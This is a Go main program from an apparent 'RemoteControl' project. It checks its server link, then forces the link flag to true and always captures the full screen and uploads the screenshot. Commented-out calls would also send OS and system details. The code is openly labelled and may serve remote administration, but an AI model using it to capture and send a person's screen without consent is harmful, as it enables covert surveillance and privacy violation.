package main

import (
	"RemoteControl/pkg/remote"
	"RemoteControl/pkg/shared"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
)

// Whether the server is being connected
var GIsLinkingWithServer = false

//Post("http://xxxx","application/json;charset=utf-8",[]byte("{'aaa':'bbb'}"))
func Post(url string, contentType string, body []byte) (string, error) {
	res, err := http.Post(url, contentType, strings.NewReader(string(body)))
	if err != nil {
		return "", err
	}
	defer res.Body.Close()
	content, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}
	return string(content), nil
}

func main() {
	shared.Print("检查运行环境：")
	//osid, osName := runtime.GetSystem()
	//shared.Print(fmt.Sprintf("    操作系统：%s\n", osName))
	GIsLinkingWithServer = remote.TestServerLink()
	if GIsLinkingWithServer {
		fmt.Printf("    确认服务器连接情况：%s\n", "在线")
		//shared.Print(fmt.Sprintf("    确认服务器连接情况：%s\n", "在线"))
	} else {
		fmt.Printf("    确认服务器连接情况：%s\n", "离线")
		//shared.Print(fmt.Sprintf("    确认服务器连接情况：%s\n", "离线"))
	}
	GIsLinkingWithServer = true
	if GIsLinkingWithServer {
		// send os infomation
		//>>> remote.SendMsg(fmt.Sprintf("操作系统：%s\n", osName))
		// send the system infomation to the server
		//>>>> remote.SendMsg(runtime.GetSystemInfo(osid))
		// 截图
		filename := remote.CaptureFullScreen()
		filesize := strconv.FormatInt(remote.GetFileSize(filename), 10)
		remote.SendMsg("screen_" + filename + "_" + filesize)
		// 发送文件
		remote.SendFile(filename)
	}
}
